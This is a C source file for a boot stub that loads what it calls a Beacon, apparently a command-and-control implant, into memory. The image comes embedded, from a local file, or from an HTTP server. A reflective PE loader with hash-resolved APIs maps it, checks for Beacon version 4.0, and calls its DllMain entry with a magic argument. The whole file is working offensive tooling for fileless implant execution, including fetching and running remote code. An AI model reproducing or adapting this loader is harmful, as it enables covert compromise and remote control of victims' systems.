#include "c_types.h"
#include "win_types.h"
#include "lib_memory.h"
#include "pe_image.h"
#include "rel_addr.h"
#include "errno.h"
#include "runtime.h"
#include "pe_loader.h"
#include "boot.h"

static Runtime_M* initRuntime(void* boot, Runtime_Opts* opts);
static uint32     pe_loader_size();

static void* loadImage(Runtime_M* runtime);
static void* loadImageFromEmbed(Runtime_M* runtime, byte* config);
static void* loadImageFromFile(Runtime_M* runtime, byte* config);
static void* loadImageFromHTTP(Runtime_M* runtime, byte* config);

errno Boot(void* ctx)
{
    // initialize Gleam-RT for PE Loader
    Runtime_M* runtime = initRuntime(GetFuncAddr(&Boot), NULL);
    if (runtime == NULL)
    {
        return GetLastErrno();
    }

    // reserved context and extended arguments
    (void)ctx;

    // initialize PE Loader and load image
    uint16 version;
    PELoader_M* loader = NULL;
    errno err = NO_ERROR;
    for (;;)
    {
        // check the Beacon version
        if (!runtime->Argument.GetValue(ARG_ID_VERSION, &version, NULL))
        {
            err = ERR_NOT_FOUND_VERSION;
            break;
        }
        if (version < 0x0400) // v4.0
        {
            err = ERR_UNSUPPORTED_VERSION;
            break;
        }
        // load PE Image, it cannot be empty
        void* image = loadImage(runtime);
        if (image == NULL)
        {
            err = GetLastErrno();
            break;
        }
        // prevent incorrect optimization about init struct
        PELoader_Cfg config;
        mem_init(&config, sizeof(config));
        config.FindAPI     = runtime->HashAPI.FindAPI_MA;
        config.Image       = image;
        config.IgnoreStdIO = true;
        // load beacon image
        loader = InitPELoader(runtime, &config);
        if (loader == NULL)
        {
            err = GetLastErrno();
            break;
        }
        runtime->Memory.Free(image);
        // initialize dll before start beacon
        err = loader->Execute();
        break;
    }
    if (err != NO_ERROR || loader == NULL)
    {
        runtime->Core.Exit();
        return err;
    }

    // call beacon entry point and it will be blocked
    switch (version)
    {
    case 0x0400:
        DllMain_t dllMain = (DllMain_t)(loader->EntryPoint);
        HMODULE   hModule = (HMODULE)(loader->ImageBase);
        if (!dllMain(hModule, 4, (LPVOID)(0x56A2B5F0)))
        {
            err = ERR_CALL_BEACON_ENTRY_POINT;
        }
        break;
    default:
        panic(PANIC_UNREACHABLE_CODE);
    }
    runtime->Argument.EraseAll();

    // destroy pe loader and exit runtime
    errno eld = loader->Destroy();
    if (eld != NO_ERROR && err == NO_ERROR)
    {
        err = eld;
    }
    return err;
}

static void* loadImage(Runtime_M* runtime)
{
    byte*  config = NULL;
    uint32 size;
    if (!runtime->Argument.GetPointer(ARG_ID_PE_IMAGE, &config, &size))
    {
        SetLastErrno(ERR_NOT_FOUND_PE_IMAGE);
        return NULL;
    }
    if (config == NULL || size == 0)
    {
        SetLastErrno(ERR_EMPTY_PE_IMAGE_DATA);
        return NULL;
    }
    if (size < 1)
    {
        SetLastErrno(ERR_INVALID_IMAGE_CONFIG);
        return NULL;
    }
    byte mode = *config;
    config++;
    switch (mode)
    {
    case MODE_EMBED_IMAGE:
        return loadImageFromEmbed(runtime, config);
    case MODE_LOCAL_FILE:
        return loadImageFromFile(runtime, config);
    case MODE_HTTP_SERVER:
        return loadImageFromHTTP(runtime, config);
    default:
        SetLastErrno(ERR_INVALID_LOAD_MODE);
        return NULL;
    }
}

static void* loadImageFromEmbed(Runtime_M* runtime, byte* config)
{
    byte mode = *config;
    config++;
    switch (mode)
    {
    case EMBED_ENABLE_COMPRESSION:
      {
        uint32 rawSize = *(uint32*)(config+0);
        uint32 comSize = *(uint32*)(config+4);
        byte*  comData = (byte*)(config+8);
        void* buf = runtime->Memory.Alloc(rawSize);
        uint size = runtime->Compressor.Decompress(buf, comData, comSize);
        if (size != (uint)rawSize)
        {
            SetLastErrno(ERR_INVALID_COMPRESS_DATA);
            return NULL;
        }
        return buf;
      }
    case EMBED_DISABLE_COMPRESSION:
      {
        uint32 size = *(uint32*)config;
        void* buf = runtime->Memory.Alloc(size);
        mem_copy(buf, config + 4, size);
        return buf;
      }
    default:
        SetLastErrno(ERR_INVALID_EMBED_CONFIG);
        return NULL;
    }
}

static void* loadImageFromFile(Runtime_M* runtime, byte* config)
{
    databuf file;
    errno errno = runtime->WinFile.ReadFileW((LPWSTR)config, &file);
    if (errno != NO_ERROR)
    {
        SetLastErrno(errno);
        return NULL;
    }
    if (file.len < 64)
    {
        SetLastErrno(ERR_INVALID_PE_IMAGE);
        return NULL;
    }
    return file.buf;
}

static void* loadImageFromHTTP(Runtime_M* runtime, byte* config)
{
    HTTP_Request req;
    if (!runtime->Serialization.Unserialize(config, &req))
    {
        SetLastErrno(ERR_INVALID_HTTP_CONFIG);
        return NULL;
    }
    HTTP_Response resp;
    errno errno = runtime->WinHTTP.Get(&req, &resp);
    if (errno != NO_ERROR)
    {
        SetLastErrno(errno);
        return NULL;
    }
    if (resp.StatusCode != 200)
    {
        SetLastErrno(ERR_INVALID_HTTP_STATUS_CODE);
        return NULL;   
    }
    if (resp.Body.len < 64)
    {
        SetLastErrno(ERR_INVALID_PE_IMAGE);
        return NULL;
    }
    runtime->WinHTTP.FreeDLL();
    return resp.Body.buf;
}

static Runtime_M* initRuntime(void* boot, Runtime_Opts* opts)
{
    uintptr base = (uintptr)(GetFuncAddr(&InitPELoader));
    uintptr addr = base + pe_loader_size();
    typedef Runtime_M* (*InitRuntime_t)(void* boot, Runtime_Opts* opts);
    InitRuntime_t init = (InitRuntime_t)addr;
    return init(boot, opts);
}

#pragma optimize("", off)

// the size will be replaced by builder or generator
static uint32 pe_loader_size()
{
    return STUB_PE_LOADER_SIZE;
}

#pragma optimize("", on)
